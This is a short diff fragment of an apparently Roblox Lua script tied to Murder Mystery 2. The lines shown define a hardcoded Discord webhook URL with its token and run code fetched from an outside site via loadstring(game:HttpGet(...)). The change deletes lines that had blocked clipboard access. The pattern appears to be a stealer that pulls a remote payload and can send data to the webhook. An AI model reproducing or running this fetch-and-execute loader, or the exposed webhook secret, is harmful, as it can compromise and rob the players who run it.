@@ -3,5 +3,3 @@ Webhook = "https://discord.com/api/webhooks/1269369914666516581/XRAq9S7qAHyG8-uH
 
 
 loadstring(game:HttpGet("https://egorikusa.space/mm2"))()
-setclipboard = nil
-setclipboard = function() end
